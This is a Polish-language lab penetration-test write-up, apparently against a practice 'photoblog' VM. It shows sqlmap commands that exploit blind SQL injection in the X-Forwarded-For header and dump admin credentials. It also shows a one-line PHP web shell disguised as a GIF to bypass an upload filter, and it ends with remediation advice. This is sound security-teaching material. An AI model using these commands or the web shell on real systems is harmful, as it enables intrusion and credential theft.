# Blind SQL Injection & File Upload (Remote Code Execution)

## Cel testów
Wykorzystanie podatności Blind SQL Injection znajdującej się w obiekcie nagłówka HTTP w celu pozyskania danych logowania administratora. Następnie eskalacja uprawnień wykonując atak ominięcia filtrów w panelu File Upload, prowadząc do zdalnego egzekwowania kodu – Remote Code Execution (RCE) w oparciu o przeoczenie konfiguracyjne po stronie serwera aplikacyjnego.

---

## Część 1: Blind SQL Injection (X-Forwarded-For)

### 1.1 Identyfikacja punktu wstrzyknięcia
Podczas wstępnych skanowań tradycyjne sposoby modyfikowania parametrów GET okazały się bezpieczne. Aplikacja logowała za to nagłówki związane z ruchem sieciowym. Poinstruowano precyzyjnie narzędzie `sqlmap`, by dokonało zastrzyku w polu `X-Forwarded-For` deklarując punkt docelowy za pomocą custom injection mark (`*`).

```bash
sqlmap -u "http://192.168.56.102/cat.php?id=1" --headers="X-Forwarded-For: *" --dbs --batch
```

**Wynik:**
![Wykryte bazy danych](img/sqli_dbs.png)
Narzędzie przy pomocy zapytań opartych o upływ czasu (Time-based Blind) zidentyfikowało bazę danych podatnej aplikacji o nazwie `photoblog`.

### 1.2 Ekstrakcja danych
Dokonano zewidencjonowania zawartości tabeli `users` wykorzystując uprzednio poznaną nazwę bazy danych.

```bash
sqlmap -u "http://192.168.56.102/cat.php?id=1" --headers="X-Forwarded-For: *" -D photoblog -T users --dump --batch
```

**Wynik:**
![Odzyskane poświadczenia](img/sqli_users_dump.png)
Baza danych zwróciła hash będący w posiadaniu administratora, po czym nastąpiło automatyczne odgadnięcie (odzyskanie) go dając parę:
- **Login:** `admin`
- **Hasło:** `P4ssw0rd`

---

## Część 2: Eskalacja na środowisko robocze – File Upload

Po pomyślnym zastosowaniu skradzionych danych na stronie logowania, wykryto punkt wgrywania plików służący do umieszczania grafik na stronie bloga (zakładka "Add a new picture").

W naturalny sposób proces ten powinien zabezpieczać się na wypadek załączania niedozwolonych formatów, weryfikując rozszerzenia i treść bitową pliku, by nie dopuścić np. skryptów `.php`.

### Tworzenie Malicious Image
Skonstruowano plik przypominający formą `.gif`, zawierający zamiast obrazu szkodliwy kod PHP:
```bash
echo -e "GIF89a\n<?php system(\$_GET['cmd']); ?>" > fake_image.gif
```

Z tak przygotowanym `fake_image.gif`, system zabezpieczający platformy analizował nagłówek, nie biorąc pod uwagę wklejonego natywnego bloku logicznego PHP przemyconego tuż po sygnaturze graficznej. Obiekt został wprowadzony pomimo swojej rzeczywistej klasyfikacji, potwierdzając tym samym istnienie podatności typu Unrestricted File Upload i gotowości na obroty zdalnego wykonania operacji (RCE) przez podatne obejścia systemu obsługującego Nginx pod dobudowanym odwołaniem na żądanie.

**Wynik wgrania uzbrojonego pliku (Web Shell):**
![Złośliwy obraz wrzucony przez panel](img/file_uploaded.png)

Potwierdzono wprowadzenie na nośniki serwera złośliwego pliku. Mechanika platformy nie sprawdziła powiązań struktury obrazu z niebezpiecznymi wektorami wejścia.

---

## Podsumowanie i Rekomendacje

**Zidentyfikowane problemy logiki zabezpieczeń:**
1. Brak odpowiedniego testowania i filtracji wewnętrznej nagłówków uwierzytelnianych po stronie usługi i dopuszczaniu ich parametrów do operacji na bazie danych (Blind Time-based SQLi).
2. Brak jakiejkolwiek re-kompilacji formatu wizualnego przy wgrywaniu obrazów oraz ufanie powierzchownym sygnaturom formatów (File Upload Vulnerability), wpuszczając w pamięć magazynową platformy niezdetonowane luki kodowe.

**Rekomendacje:**
1. Zawsze wykorzystywać `Prepared Statements` (Zapytania Parametryzowane) niezależnie od faktu wprowadzania parametrów pochodzących z adresów wizualnych `$_GET` czy rzekomo stałych informacji `HTTP Headers`.
2. Zdjęcia na serwerze webowym docelowo konwertować poprzez odpowiednie wtyczki środowisk. Procedura ta samoczynnie obcina nieprawidłowe śmieciowe formaty (jak wklejony komentarz czy wektor skryptowy umieszczony po znaczniku formatu), zapisując poprawny, świeży "czysty" plik w archiwach serwera, całkowicie blokując możliwość przenikań RCE w przyszłości.